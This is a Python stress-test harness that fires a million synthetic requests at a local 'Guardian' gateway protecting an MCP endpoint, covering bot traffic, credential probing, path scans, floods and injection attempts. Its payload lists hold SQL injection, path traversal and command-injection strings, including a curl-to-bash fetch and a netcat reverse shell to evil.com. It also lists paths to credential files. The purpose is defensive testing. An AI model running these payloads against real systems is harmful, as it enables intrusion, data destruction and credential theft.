#!/usr/bin/env python3
"""
Million-case stress harness for Guardian.

Generates 1,000,000+ test requests across 10 traffic categories, then executes
them in configurable batches against the live study endpoint (127.0.0.1:8790).
Run ON MYSERVER so CF-Connecting-IP spoofing works (trusted from loopback).

Usage:
    # Generate test plan (no network, creates megaharness_plan.jsonl)
    python3 megaharness.py generate

    # Execute batch N (1-indexed), default batch_size=10000
    python3 megaharness.py run --batch 1
    python3 megaharness.py run --batch 1 --batch-size 50000

    # Execute all batches sequentially
    python3 megaharness.py run --all

    # Summarize collected results
    python3 megaharness.py report
"""
from __future__ import annotations
import argparse, http.client, json, math, os, pathlib, random, secrets
import statistics as st, sys, time
from collections import Counter, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

PLAN_FILE = pathlib.Path(__file__).parent / "megaharness_plan.jsonl"
RESULTS_DIR = pathlib.Path(__file__).parent / "megaharness_results"
HOST = "127.0.0.1"
PORT = 8790
CONCURRENCY = 20
BATCH_SIZE = 10_000

# --- RFC 5737 / RFC 3849 documentation addresses only ---
# 192.0.2.0/24 (TEST-NET-1), 198.51.100.0/24 (TEST-NET-2), 203.0.113.0/24 (TEST-NET-3)
# 2001:db8::/32 (IPv6 docs)

BOT_SIGNATURES = [
    "GPTBot/1.2", "ClaudeBot/1.0", "CCBot/2.0", "Bytespider",
    "PetalBot/2.5", "AhrefsBot/7.0", "SemrushBot/7~bl",
    "DataForSeoBot/1.0", "DotBot/1.2", "MJ12bot/v1.4.8",
    "BLEXBot/1.0", "Sogou web spider/4.0", "YandexBot/3.0",
    "bingbot/2.0", "Googlebot/2.1", "facebookexternalhit/1.1",
    "Applebot/0.1", "Twitterbot/1.0", "LinkedInBot/1.0",
    "Slurp", "Baiduspider/2.0", "DuckDuckBot/1.1",
    "ia_archiver", "archive.org_bot", "Wget/1.21",
    "sqlmap/1.8", "nuclei/3.0", "Nmap Scripting Engine",
    "masscan/1.3", "ZmEu", "Nikto/2.1.6",
    "dirsearch/0.4", "gobuster/3.6", "ffuf/2.1",
    "wpscan/3.8", "jorgee", "python-requests/2.31.0 (scanner)",
    "curl/7.68 (vuln-check)",
]

BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/127.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/128.0 Mobile Safari/537.36",
]

MCP_CLIENT_UAS = [
    "claude-code/2.1.0", "python-httpx/0.28.1", "mcp-inspector/0.16",
    "node-mcp/1.0", "cursor/0.42", "windsurf/1.0",
    "continue/0.9", "zed-mcp/0.1", "cline/3.0",
]

VULN_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD", "/wp-login.php", "/wp-admin/",
    "/admin", "/admin/", "/phpmyadmin/", "/pma/", "/.htaccess", "/.htpasswd",
    "/server-status", "/server-info", "/actuator/env", "/actuator/health",
    "/config.json", "/config.yml", "/config.yaml", "/backup.zip", "/backup.sql",
    "/database.sql", "/dump.sql", "/api/v1/users", "/api/admin", "/console",
    "/debug", "/trace", "/metrics", "/graphql", "/api-docs", "/swagger.json",
    "/robots.txt", "/sitemap.xml", "/.well-known/security.txt", "/crossdomain.xml",
    "/elmah.axd", "/web.config", "/WEB-INF/web.xml", "/META-INF/MANIFEST.MF",
    "/cgi-bin/", "/shell", "/cmd", "/exec", "/eval", "/run",
    "/.aws/credentials", "/.docker/config.json", "/.kube/config",
    "/etc/passwd", "/etc/shadow", "/proc/self/environ",
    "/.ssh/id_rsa", "/.ssh/authorized_keys",
]

SQLI_PAYLOADS = [
    "' OR 1=1 --", "' UNION SELECT * FROM users --", "1; DROP TABLE users",
    "admin'--", "' OR ''='", "1' AND 1=1#", "'; EXEC xp_cmdshell('whoami')--",
    "1 UNION ALL SELECT NULL,NULL,NULL", "' OR 1=1/*", "') OR ('1'='1",
]

CMDI_PAYLOADS = [
    "; cat /etc/passwd", "| whoami", "$(id)", "`id`", "&& ls -la /",
    "; curl http://evil.com/shell.sh | bash", "| nc -e /bin/sh 10.0.0.1 4444",
    "; rm -rf /", "$(wget http://evil.com/malware)", "| ping -c 3 evil.com",
]

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd", "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam", "../../../proc/self/environ",
    "..%252f..%252f..%252fetc/passwd", "..%c0%af..%c0%afetc/passwd",
]

BENIGN_TOOL_INPUTS = [
    "why is the database dropping connections?",
    "the SELECT query is slow, help me optimize",
    "show me the table of running containers",
    "can you delete the old log files from /var/log?",
    "update the DNS record for the staging server",
    "execute the deployment script when CI passes",
    "the union of these two data sources is what we need",
    "select the right instance type for our workload",
    "curl is timing out when hitting the health endpoint",
    "we need to chmod the deployment key after rotation",
    "check if the nginx process is running",
    "restart the docker compose stack",
    "how much disk space is left on the server?",
    "pull the latest image from the registry",
    "what's the CPU usage over the last hour?",
    "list all open ports on this machine",
    "check the SSL certificate expiry date",
    "is the backup job running on schedule?",
    "show me the error logs from the last 24 hours",
    "what version of python is installed?",
]


def rpc_body(method="tools/list", id_=1, params=None):
    m = {"jsonrpc": "2.0", "method": method}
    if id_ is not None:
        m["id"] = id_
    if params is not None:
        m["params"] = params
    return json.dumps(m)


def doc_ipv4(n):
    """Map integer n to a documentation-range IPv4. Cycles through 3 /24 blocks = 762 usable."""
    blocks = [(192, 0, 2), (198, 51, 100), (203, 0, 113)]
    b = blocks[n % 3]
    host = 1 + (n // 3) % 254
    return f"{b[0]}.{b[1]}.{b[2]}.{host}"


def doc_ipv6(n):
    """Map integer n to a documentation-range IPv6 within a single /64."""
    return f"2001:db8:dead:beef::{n:x}"


# === TRAFFIC GENERATORS ===
# Each returns a list of request dicts: {method, path, ip, ua, token, body, category, subcategory}

def gen_benign_sessions(count=100_000):
    """C1: Legitimate MCP client sessions — valid auth, normal tool calls."""
    cases = []
    valid_token = "__VALID__"
    for i in range(count):
        ip = doc_ipv4(i % 500)
        ua = MCP_CLIENT_UAS[i % len(MCP_CLIENT_UAS)]
        # Each "session": initialize, notification, then tool calls
        phase = i % 4
        if phase == 0:
            body = rpc_body("initialize", i, {"protocolVersion": "2025-06-18",
                            "capabilities": {}, "clientInfo": {"name": "eval", "version": "1"}})
        elif phase == 1:
            body = rpc_body("notifications/initialized", None)
        elif phase == 2:
            body = rpc_body("tools/list", i)
        else:
            body = rpc_body("tools/call", i, {"name": "devops_status", "arguments": {}})
        cases.append({"method": "POST", "path": "/mcp", "ip": ip, "ua": ua,
                      "token": valid_token, "body": body,
                      "category": "C1_benign", "subcategory": "mcp_session"})
    return cases


def gen_declared_bots(count=100_000):
    """C2: Declared bot/crawler UAs — should all be blocked immediately."""
    cases = []
    for i in range(count):
        sig = BOT_SIGNATURES[i % len(BOT_SIGNATURES)]
        ip = doc_ipv4(400 + (i % 200))
        ua = f"Mozilla/5.0 (compatible; {sig}; +https://example.com/bot)"
        method = random.choice(["GET", "POST"])
        path = random.choice(["/", "/mcp", "/robots.txt", "/.well-known/oauth-protected-resource"])
        cases.append({"method": method, "path": path, "ip": ip, "ua": ua,
                      "token": None, "body": rpc_body() if method == "POST" else None,
                      "category": "C2_declared_bots", "subcategory": sig.split("/")[0].lower()})
    return cases


def gen_credential_probing(count=150_000):
    """C3: Credential probing — bad tokens from single and multiple sources."""
    cases = []
    # C3a: Single-source brute force (should trigger authfail ban)
    single_count = count // 3
    for i in range(single_count):
        source = i // 50  # each source tries 50 passwords
        ip = doc_ipv4(600 + (source % 100))
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": random.choice(["curl/8.5.0", "python-requests/2.31.0", "Go-http-client/2.0"]),
                      "token": f"__BAD_{secrets.token_hex(4)}__",
                      "body": rpc_body(),
                      "category": "C3_credential_probe", "subcategory": "single_source"})

    # C3b: Distributed probing (1 guess per IP — tests global alarm)
    dist_count = count // 3
    for i in range(dist_count):
        ip = doc_ipv4(i % 762)
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": BROWSER_UAS[i % len(BROWSER_UAS)],
                      "token": f"__BAD_{secrets.token_hex(4)}__",
                      "body": rpc_body(),
                      "category": "C3_credential_probe", "subcategory": "distributed"})

    # C3c: Spray then rotate (try N tokens, switch IP)
    spray_count = count - single_count - dist_count
    for i in range(spray_count):
        group = i // 10  # 10 guesses per IP then rotate
        ip = doc_ipv4(100 + (group % 400))
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": "python-requests/2.31.0",
                      "token": f"__BAD_{secrets.token_hex(4)}__",
                      "body": rpc_body(),
                      "category": "C3_credential_probe", "subcategory": "spray_rotate"})
    return cases


def gen_path_scanning(count=100_000):
    """C4: Path/directory scanning — probing for known vulnerable paths."""
    cases = []
    for i in range(count):
        ip = doc_ipv4(200 + (i // 100) % 300)
        path = VULN_PATHS[i % len(VULN_PATHS)]
        cases.append({"method": "GET", "path": path, "ip": ip,
                      "ua": random.choice(BROWSER_UAS + ["curl/8.5.0", "python-requests/2.31.0"]),
                      "token": None, "body": None,
                      "category": "C4_path_scan", "subcategory": path.split("/")[1] if len(path.split("/")) > 1 else "root"})
    return cases


def gen_rate_flooding(count=100_000):
    """C5: Rate flooding — bursts from single sources to trigger 429."""
    cases = []
    sources = count // 500  # each source sends 500 requests in a burst
    for s in range(sources):
        ip = doc_ipv4(50 + (s % 200))
        for r in range(500):
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": random.choice(["curl/8.5.0", "Go-http-client/2.0"]),
                          "token": None, "body": rpc_body(),
                          "category": "C5_flood", "subcategory": f"source_{s%200}"})
    return cases[:count]


def gen_ipv6_rotation(count=50_000):
    """C6: IPv6 /64 rotation — addresses within the same /64 prefix."""
    cases = []
    for i in range(count):
        ip = doc_ipv6(i)
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": "curl/8.5.0",
                      "token": f"__BAD_{secrets.token_hex(4)}__",
                      "body": rpc_body(),
                      "category": "C6_ipv6_rotation", "subcategory": "64_rotation"})
    return cases


def gen_spoofed_ua_crawlers(count=50_000):
    """C7: Crawlers with spoofed browser UAs — should pass UA check but fail auth."""
    cases = []
    for i in range(count):
        ip = doc_ipv4(300 + (i % 200))
        cases.append({"method": random.choice(["GET", "POST"]), "path": random.choice(["/", "/mcp"]),
                      "ip": ip, "ua": BROWSER_UAS[i % len(BROWSER_UAS)],
                      "token": None,
                      "body": rpc_body() if random.random() > 0.5 else None,
                      "category": "C7_spoofed_ua", "subcategory": "browser_impersonation"})
    return cases


def gen_adaptive_adversary(count=50_000):
    """C8: Adaptive adversaries — change behavior after detection."""
    cases = []
    # C8a: UA swap after bot-ban (switch from bot UA to browser UA)
    swap_count = count // 3
    for i in range(swap_count):
        source = i // 4
        ip = doc_ipv4(700 + (source % 60))
        phase = i % 4
        if phase == 0:
            ua = f"Mozilla/5.0 (compatible; {BOT_SIGNATURES[source % len(BOT_SIGNATURES)]})"
        else:
            ua = BROWSER_UAS[phase % len(BROWSER_UAS)]
        cases.append({"method": "POST", "path": "/mcp", "ip": ip, "ua": ua,
                      "token": None, "body": rpc_body(),
                      "category": "C8_adaptive", "subcategory": "ua_swap"})

    # C8b: IP rotation after ban
    rotate_count = count // 3
    for i in range(rotate_count):
        cluster = i // 20
        ip_offset = (cluster * 20 + i % 20) % 762
        ip = doc_ipv4(ip_offset)
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": "python-requests/2.31.0",
                      "token": f"__BAD_{secrets.token_hex(4)}__",
                      "body": rpc_body(),
                      "category": "C8_adaptive", "subcategory": "ip_rotation"})

    # C8c: Slowloris-style (1 req every few seconds to stay under rate limit)
    slow_count = count - swap_count - rotate_count
    for i in range(slow_count):
        ip = doc_ipv4(50 + (i // 100) % 100)
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": BROWSER_UAS[0],
                      "token": f"__BAD_{secrets.token_hex(4)}__",
                      "body": rpc_body(),
                      "category": "C8_adaptive", "subcategory": "slow_probe",
                      "delay_ms": 200})
    return cases


def gen_mixed_realistic(count=200_000):
    """C9: Interleaved benign + malicious — simulates real traffic mix."""
    cases = []
    valid_token = "__VALID__"
    for i in range(count):
        roll = random.random()
        if roll < 0.30:
            # 30% legit MCP
            ip = doc_ipv4(i % 100)
            ua = MCP_CLIENT_UAS[i % len(MCP_CLIENT_UAS)]
            cases.append({"method": "POST", "path": "/mcp", "ip": ip, "ua": ua,
                          "token": valid_token, "body": rpc_body("tools/list", i),
                          "category": "C9_mixed", "subcategory": "legit"})
        elif roll < 0.45:
            # 15% bots
            sig = BOT_SIGNATURES[i % len(BOT_SIGNATURES)]
            ip = doc_ipv4(500 + (i % 200))
            cases.append({"method": "GET", "path": "/", "ip": ip,
                          "ua": f"{sig}", "token": None, "body": None,
                          "category": "C9_mixed", "subcategory": "bot"})
        elif roll < 0.60:
            # 15% credential probes
            ip = doc_ipv4(200 + (i % 300))
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": "curl/8.5.0", "token": f"__BAD_{secrets.token_hex(4)}__",
                          "body": rpc_body(), "category": "C9_mixed", "subcategory": "probe"})
        elif roll < 0.75:
            # 15% path scans
            ip = doc_ipv4(100 + (i % 400))
            path = VULN_PATHS[i % len(VULN_PATHS)]
            cases.append({"method": "GET", "path": path, "ip": ip,
                          "ua": BROWSER_UAS[i % len(BROWSER_UAS)], "token": None, "body": None,
                          "category": "C9_mixed", "subcategory": "pathscan"})
        elif roll < 0.85:
            # 10% robots.txt / discovery
            ip = doc_ipv4(i % 762)
            cases.append({"method": "GET", "path": random.choice(["/robots.txt", "/", "/healthz"]),
                          "ip": ip, "ua": BROWSER_UAS[i % len(BROWSER_UAS)],
                          "token": None, "body": None,
                          "category": "C9_mixed", "subcategory": "discovery"})
        else:
            # 15% flood burst
            ip = doc_ipv4(i % 50)
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": "Go-http-client/2.0", "token": None,
                          "body": rpc_body(), "category": "C9_mixed", "subcategory": "flood"})
    return cases


def gen_bastion_content(count=100_000):
    """C10: Bastion content attacks — injection payloads in tool arguments."""
    cases = []
    valid_token = "__VALID__"
    total_attack = count * 7 // 10  # 70% attacks
    total_benign = count - total_attack  # 30% benign

    # Attack payloads
    for i in range(total_attack):
        category_roll = i % 3
        if category_roll == 0:
            payload = SQLI_PAYLOADS[i % len(SQLI_PAYLOADS)]
            subcat = "sqli"
        elif category_roll == 1:
            payload = CMDI_PAYLOADS[i % len(CMDI_PAYLOADS)]
            subcat = "cmdi"
        else:
            payload = TRAVERSAL_PAYLOADS[i % len(TRAVERSAL_PAYLOADS)]
            subcat = "traversal"

        ip = doc_ipv4(i % 500)
        body = rpc_body("tools/call", i, {"name": "shell_explain", "arguments": {"command": payload}})
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": MCP_CLIENT_UAS[i % len(MCP_CLIENT_UAS)],
                      "token": valid_token, "body": body,
                      "category": "C10_bastion", "subcategory": subcat})

    # Benign tool calls that contain SQL-like keywords (false positive test)
    for i in range(total_benign):
        phrase = BENIGN_TOOL_INPUTS[i % len(BENIGN_TOOL_INPUTS)]
        ip = doc_ipv4(i % 200)
        body = rpc_body("tools/call", i, {"name": "shell_explain", "arguments": {"command": phrase}})
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": MCP_CLIENT_UAS[i % len(MCP_CLIENT_UAS)],
                      "token": valid_token, "body": body,
                      "category": "C10_bastion", "subcategory": "benign_fp_test"})
    return cases


# === PLAN GENERATION ===

def generate():
    print("Generating 1,000,000 test cases...")
    random.seed(2026)

    generators = [
        ("C1_benign",           gen_benign_sessions,     100_000),
        ("C2_declared_bots",    gen_declared_bots,       100_000),
        ("C3_credential_probe", gen_credential_probing,  150_000),
        ("C4_path_scan",        gen_path_scanning,       100_000),
        ("C5_flood",            gen_rate_flooding,       100_000),
        ("C6_ipv6_rotation",    gen_ipv6_rotation,        50_000),
        ("C7_spoofed_ua",       gen_spoofed_ua_crawlers,  50_000),
        ("C8_adaptive",         gen_adaptive_adversary,   50_000),
        ("C9_mixed",            gen_mixed_realistic,     200_000),
        ("C10_bastion",         gen_bastion_content,     100_000),
    ]

    total = 0
    with open(PLAN_FILE, "w") as f:
        for name, gen_fn, count in generators:
            t0 = time.time()
            cases = gen_fn(count)
            for case in cases:
                f.write(json.dumps(case, separators=(",", ":")) + "\n")
            elapsed = time.time() - t0
            print(f"  {name}: {len(cases):>8,} cases ({elapsed:.1f}s)")
            total += len(cases)

    size_mb = PLAN_FILE.stat().st_size / (1024 * 1024)
    print(f"\nTotal: {total:,} cases -> {PLAN_FILE.name} ({size_mb:.1f} MB)")
    print(f"Batches of {BATCH_SIZE:,}: {math.ceil(total / BATCH_SIZE)}")
    return total


# === EXECUTION ===

def send_request(case, real_token):
    """Send a single request. Returns (case, status, latency_ms)."""
    token = real_token if case.get("token") == "__VALID__" else case.get("token")
    headers = {"User-Agent": case["ua"], "Content-Type": "application/json"}
    if case["ip"]:
        headers["CF-Connecting-IP"] = case["ip"]
    if token:
        headers["Authorization"] = f"Bearer {token}"

    body = case.get("body")
    data = body.encode() if body else None

    try:
        conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
        t0 = time.perf_counter()
        conn.request(case["method"], case["path"], body=data, headers=headers)
        resp = conn.getresponse()
        resp.read()
        latency_ms = (time.perf_counter() - t0) * 1000
        status = resp.status
        conn.close()
        return (case["category"], case["subcategory"], status, round(latency_ms, 3))
    except Exception as e:
        return (case["category"], case["subcategory"], -1, 0)


def run_batch(batch_num, batch_size, real_token, concurrency):
    """Execute a single batch."""
    RESULTS_DIR.mkdir(exist_ok=True)
    result_file = RESULTS_DIR / f"batch_{batch_num:04d}.jsonl"

    # Load the specific batch from the plan
    start = (batch_num - 1) * batch_size
    end = start + batch_size
    cases = []
    with open(PLAN_FILE) as f:
        for i, line in enumerate(f):
            if i >= end:
                break
            if i >= start:
                cases.append(json.loads(line))

    if not cases:
        print(f"Batch {batch_num}: no cases (past end of plan)")
        return

    total_batches = math.ceil(sum(1 for _ in open(PLAN_FILE)) / batch_size)
    print(f"Batch {batch_num}/{total_batches}: {len(cases):,} cases, concurrency={concurrency}")

    results = []
    t_start = time.time()
    done = 0

    with ThreadPoolExecutor(max_workers=concurrency) as pool:
        futures = {pool.submit(send_request, c, real_token): c for c in cases}
        for future in as_completed(futures):
            result = future.result()
            results.append(result)
            done += 1
            if done % 1000 == 0:
                elapsed = time.time() - t_start
                rps = done / elapsed if elapsed > 0 else 0
                print(f"  {done:>7,}/{len(cases):,}  ({rps:.0f} req/s)", end="\r")

    elapsed = time.time() - t_start
    rps = len(cases) / elapsed if elapsed > 0 else 0

    # Write results
    with open(result_file, "w") as f:
        for r in results:
            f.write(json.dumps({"cat": r[0], "sub": r[1], "status": r[2], "ms": r[3]},
                               separators=(",", ":")) + "\n")

    # Summary
    status_counts = Counter(r[2] for r in results)
    cat_counts = Counter(r[0] for r in results)
    latencies = [r[3] for r in results if r[3] > 0]

    print(f"\nBatch {batch_num} complete: {len(cases):,} requests in {elapsed:.1f}s ({rps:.0f} req/s)")
    print(f"  Status: {dict(sorted(status_counts.items()))}")
    if latencies:
        print(f"  Latency: p50={st.median(latencies):.1f}ms  p95={sorted(latencies)[int(len(latencies)*0.95)]:.1f}ms  "
              f"p99={sorted(latencies)[int(len(latencies)*0.99)]:.1f}ms")
    print(f"  Saved: {result_file}")


def run_all(batch_size, real_token, concurrency):
    """Execute all batches sequentially."""
    total = sum(1 for _ in open(PLAN_FILE))
    total_batches = math.ceil(total / batch_size)
    print(f"Running all {total_batches} batches ({total:,} total cases)\n")
    for b in range(1, total_batches + 1):
        run_batch(b, batch_size, real_token, concurrency)
        if b < total_batches:
            print(f"  Cooling down 2s before next batch...")
            time.sleep(2)


# === REPORTING ===

def report():
    """Aggregate results from all batch files."""
    if not RESULTS_DIR.exists():
        print("No results yet. Run batches first.")
        return

    all_results = []
    for f in sorted(RESULTS_DIR.glob("batch_*.jsonl")):
        with open(f) as fh:
            for line in fh:
                all_results.append(json.loads(line))

    if not all_results:
        print("No results found.")
        return

    print(f"=== MEGAHARNESS REPORT ({len(all_results):,} requests) ===\n")

    # Per-category breakdown
    cats = defaultdict(lambda: {"total": 0, "status": Counter(), "latencies": []})
    for r in all_results:
        c = cats[r["cat"]]
        c["total"] += 1
        c["status"][r["status"]] += 1
        if r["ms"] > 0:
            c["latencies"].append(r["ms"])

    print(f"{'Category':<25} {'Total':>8} {'200':>7} {'401':>7} {'403':>7} {'404':>7} {'429':>7} {'Other':>7}  {'p50ms':>7} {'p99ms':>7}")
    print("-" * 110)

    for cat in sorted(cats.keys()):
        c = cats[cat]
        sc = c["status"]
        other = c["total"] - sc[200] - sc[401] - sc[403] - sc[404] - sc[429]
        lat = sorted(c["latencies"]) if c["latencies"] else [0]
        p50 = lat[len(lat) // 2]
        p99 = lat[min(int(len(lat) * 0.99), len(lat) - 1)]
        print(f"{cat:<25} {c['total']:>8,} {sc[200]:>7,} {sc[401]:>7,} {sc[403]:>7,} {sc[404]:>7,} {sc[429]:>7,} {other:>7,}  {p50:>7.1f} {p99:>7.1f}")

    # Overall
    total_status = Counter(r["status"] for r in all_results)
    all_lat = sorted(r["ms"] for r in all_results if r["ms"] > 0)
    print("-" * 110)
    print(f"{'TOTAL':<25} {len(all_results):>8,} {total_status[200]:>7,} {total_status[401]:>7,} "
          f"{total_status[403]:>7,} {total_status[404]:>7,} {total_status[429]:>7,}")

    if all_lat:
        print(f"\nOverall latency: p50={all_lat[len(all_lat)//2]:.1f}ms  "
              f"p95={all_lat[int(len(all_lat)*0.95)]:.1f}ms  "
              f"p99={all_lat[int(len(all_lat)*0.99)]:.1f}ms  "
              f"max={all_lat[-1]:.1f}ms")

    # Subcategory breakdown
    print(f"\n{'Subcategory':<30} {'Total':>8} {'Block%':>7}")
    print("-" * 50)
    subs = defaultdict(lambda: {"total": 0, "blocked": 0})
    for r in all_results:
        s = subs[f"{r['cat']}/{r['sub']}"]
        s["total"] += 1
        if r["status"] in (403, 429):
            s["blocked"] += 1
    for sub in sorted(subs.keys()):
        s = subs[sub]
        pct = (s["blocked"] / s["total"] * 100) if s["total"] else 0
        print(f"{sub:<30} {s['total']:>8,} {pct:>6.1f}%")

    # Save report
    report_file = RESULTS_DIR / "summary.json"
    summary = {
        "total_requests": len(all_results),
        "status_distribution": dict(sorted(total_status.items())),
        "per_category": {cat: {"total": c["total"], "status": dict(sorted(c["status"].items())),
                               "p50_ms": sorted(c["latencies"])[len(c["latencies"])//2] if c["latencies"] else 0,
                               "p99_ms": sorted(c["latencies"])[min(int(len(c["latencies"])*0.99), len(c["latencies"])-1)] if c["latencies"] else 0}
                         for cat, c in cats.items()}
    }
    with open(report_file, "w") as f:
        json.dump(summary, f, indent=2)
    print(f"\nSummary saved: {report_file}")


# === CLI ===

def set_endpoint(host, port):
    global HOST, PORT
    HOST = host
    PORT = port


def main():
    parser = argparse.ArgumentParser(description="Guardian million-case stress harness")
    sub = parser.add_subparsers(dest="cmd")

    sub.add_parser("generate", help="Generate the test plan (no network)")

    run_p = sub.add_parser("run", help="Execute test batches")
    run_p.add_argument("--batch", type=int, help="Batch number (1-indexed)")
    run_p.add_argument("--all", action="store_true", help="Run all batches")
    run_p.add_argument("--batch-size", type=int, default=BATCH_SIZE)
    run_p.add_argument("--token", required=True, help="Valid bearer token for the endpoint")
    run_p.add_argument("--concurrency", type=int, default=CONCURRENCY)
    run_p.add_argument("--host", default=HOST)
    run_p.add_argument("--port", type=int, default=PORT)

    sub.add_parser("report", help="Aggregate and display results")

    args = parser.parse_args()

    if args.cmd == "generate":
        generate()
    elif args.cmd == "run":
        set_endpoint(args.host, args.port)
        if args.all:
            run_all(args.batch_size, args.token, args.concurrency)
        elif args.batch:
            run_batch(args.batch, args.batch_size, args.token, args.concurrency)
        else:
            parser.error("Specify --batch N or --all")
    elif args.cmd == "report":
        report()
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
